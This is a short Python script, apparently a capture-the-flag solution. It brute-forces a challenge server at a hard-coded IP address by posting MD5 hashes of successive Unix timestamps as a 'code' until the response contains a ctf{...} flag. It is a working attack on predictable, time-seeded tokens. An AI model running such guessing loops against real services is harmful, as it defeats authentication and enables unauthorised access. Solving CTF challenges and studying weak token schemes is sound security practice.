import requests
import hashlib
import re

def md5(input):
    input_string = str(input)
    return hashlib.md5(input_string.encode()).hexdigest()

timestamp = 1628168161
url = 'http://34.107.71.117:31235/'
pattern = r'ctf\{[0-9a-fA-F]{64}\}'

for i in range(1000):
    time = timestamp + i
    data = {"code": md5(time)}
    res = requests.post(url, data=data)
    match = re.search(pattern, res.text)
   # print(data)
    if match:
        print(match.group())
        break;
